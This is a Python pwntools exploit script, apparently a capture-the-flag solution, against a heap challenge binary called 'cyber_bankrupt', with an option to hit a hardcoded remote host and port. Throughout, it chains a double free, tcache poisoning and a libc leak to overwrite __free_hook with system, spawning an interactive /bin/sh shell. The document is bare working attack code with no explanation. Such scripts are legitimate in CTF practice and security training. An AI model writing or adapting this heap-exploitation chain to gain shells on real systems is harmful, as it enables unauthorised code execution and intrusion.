#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./cyber_bankrupt"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "94.237.56.113"
  PORT = 54514
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
libc = elf.libc

def Alloc(size, data):
  s.sendlineafter(b"> ", b"1")
  s.sendlineafter(b": ", b"0")
  s.sendlineafter(b": ", str(size).encode())
  s.sendlineafter(b": ", data)

def Free():
  s.sendlineafter(b"> ", b"2")
  s.sendlineafter(b": ", b"0")

def View():
  s.sendlineafter(b"> ", b"3")
  s.sendlineafter(b": ", b"0")

# pin code
s.sendline(b"6969")

# heap leak
Alloc(0x1e1, b"A"*0x1d8+p64(0x11))
Free()
Free()
View()
heap_leak = u64(s.recvn(6)+b"\x00\x00")
heap_base = heap_leak - 0x260
print("heap_leak =", hex(heap_leak))
print("heap_base =", hex(heap_base))

# tcache poisoning
Alloc(0x1e0, p64(heap_base))
Alloc(0x1e0, b"D")
Alloc(0x1e0, p64(0)+p64(0x431)+p64(0x303030303030303)*8+p64(heap_base+0x10)+p64(heap_base+0x50))
Alloc(0x10, b"E")

# libc leak
Free()
View()
libc_leak = u64(s.recvn(6)+b"\x00\x00")
libc_base = libc_leak - 0x3ebca0
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

free_hook = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
Alloc(0x20, p64(free_hook-8))
Alloc(0x11, b"/bin/sh\x00"+p64(system_addr))
Free()

s.interactive()  
